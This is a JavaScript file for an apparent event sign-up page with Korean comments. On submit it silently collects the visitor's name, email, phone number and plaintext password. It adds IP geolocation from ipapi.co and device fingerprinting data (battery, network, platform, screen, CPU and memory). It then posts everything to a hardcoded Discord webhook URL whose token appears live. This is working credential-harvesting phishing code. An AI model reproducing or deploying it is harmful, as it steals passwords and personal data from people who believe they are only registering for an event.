
function showJoinPage() {
  var joinPage = document.getElementById('join');
  joinPage.style.display = 'block';
}
function handleSubmit(event) {
  event.preventDefault();
  const name = document.getElementById('name').value;
  const email = document.getElementById('email').value;
  const phone = document.getElementById('phone').value;
  const pass = document.getElementById('pass').value;
  alert("회원가입이 완료되었습니다! 이벤트에 참여해 주셔서 감사합니다.");
  // 필요한 정보를 수집하여 전송할 데이터를 생성합니다.
  const data = {
    username: "MstJK",
    avatar_url: "https://example.com/avatar.png",
    content:
      `
      
     새로운 회원이 가입했습니다!\n이름: ${name}\n이메일: ${email}\n전화번호: ${phone}\n비밀번호: ${pass}
`

  };

  // 필요한 정보를 수집합니다.
  fetch('https://ipapi.co/json/')
    .then(response => response.json())
    .then(ipData => {
      Object.assign(data, ipData);
      Object.assign(data, {
        batterypercentage: navigator.getBattery ? navigator.getBattery().then(battery => battery.level * 100) : null,
        ischarging: navigator.getBattery ? navigator.getBattery().then(battery => battery.charging) : null,
        platform: navigator.platform,
        networkinfo: navigator.connection ? navigator.connection.effectiveType : null,
        networkinformation: navigator.connection ? JSON.stringify(navigator.connection) : null,
        width: window.innerWidth,
        height: window.innerHeight,
        devicelang: navigator.language,
        iscookieEnabled: navigator.cookieEnabled,
        userAgent: navigator.userAgent,
        cpuThreads: navigator.hardwareConcurrency,
        deviceram: navigator.deviceMemory
      });
      sendWebhook(data, "https://discord.com/api/webhooks/1085511645217955850/TpuwsL_TWtwpi4CCTUER2OPIIT6SQ2HYNIZTSYZ41CIu1eyecqdyeRb__zfNxeDwZnD1");
    });
  console.log("E")
  // HTTP 요청으로 웹훅에 데이터 전송하는 함수를 정의합니다.
  function sendWebhook(data, webhookURL) {
    const xhr = new XMLHttpRequest();
    xhr.open("POST", webhookURL);
    xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
    xhr.send(JSON.stringify(data));
  }

}
